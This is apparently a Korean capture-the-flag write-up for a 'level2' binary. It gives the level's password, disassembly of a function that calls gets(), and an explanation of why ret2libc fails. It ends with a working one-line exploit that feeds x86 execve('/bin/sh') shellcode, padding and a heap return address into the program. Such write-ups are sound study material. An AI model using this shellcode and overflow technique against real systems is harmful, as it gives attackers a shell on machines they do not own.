> Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

objdump를 사용해서 level2파일을 확인하면

```
0804853f <main>:
 804853f:	55                   	push   %ebp
 8048540:	89 e5                	mov    %esp,%ebp
 8048542:	83 e4 f0             	and    $0xfffffff0,%esp
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
```

```
080484d4 <p>:
 80484d4:	55                   	push   %ebp
 80484d5:	89 e5                	mov    %esp,%ebp
 80484d7:	83 ec 68             	sub    $0x68,%esp
 80484da:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484df:	89 04 24             	mov    %eax,(%esp)
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 80484ea:	89 04 24             	mov    %eax,(%esp)
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 80484f2:	8b 45 04             	mov    0x4(%ebp),%eax
 80484f5:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80484f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax
 804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 804850f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048513:	89 04 24             	mov    %eax,(%esp)
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 8048527:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 804852a:	89 04 24             	mov    %eax,(%esp)
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 8048535:	89 04 24             	mov    %eax,(%esp)
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave  
 804853e:	c3                   	ret    
```

main 함수에서는 p함수를 바로 호출한다.

p 함수는 gets로  -0x4c(%ebp)위치에 문자열을 입력받는다

그런 다음 ebp + 4위치를 확인하는데, 만약 값이 0xb로 시작하는 경우에는 그 값을 출력하고 즉시 _exit을 호출해서 프로그램이 종료된다.

그렇지 않은 경우 입력받은 문자열을 그대로 출력한 이후 strdup으로 문자열을 복제한 다음 끝난다.

이번 문제의 경우에는 저번 문제랑 접근 방법이 거의 같지만, 쉘을 얻는 함수가 코드상에 없어서 직접 만들어야 한다는 점이 다르다.

생각해 볼 수 있는 간단한 방법은 glib가 링킹되어 있다는 사실을 이용해서 스택에 "/bin/sh"와 같은 문자열을 집어넣고 system(3)함수를 호출하는 방법인데, gdb에서 info proc map을 보면 glibc의 매핑 주소 맨 앞이 전부 0x0b로 시작되서 이 방법으로는 문제를 해결할 수 없다.

조금 더 복잡한 방법은 시스템 콜을 직접 해서 쉘을 얻는 코드(쉘코드)를 직접 메모리에 주입하고, 그 코드를 이용하는 방법이다.

쉘코드와 ebp + 4를 침범하기 위한 적당한 패딩 바이트와 그 쉘코드가 실제로 메모리에 올라갈 공간을 하나로 합친 이후, 프로그램의 표준 입력으로 넣어준다.

```bash
cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 52)  + "\x08\xa0\x04\x08"') - | ./level2
```

이때 쉘코드가 올라갈 공간의 주소는 p 함수에서 마지막에 strdup를 한다는 점을 이용해서 실행 도중 값이 바뀔 위험이 적은 힙 영역으로 정했다.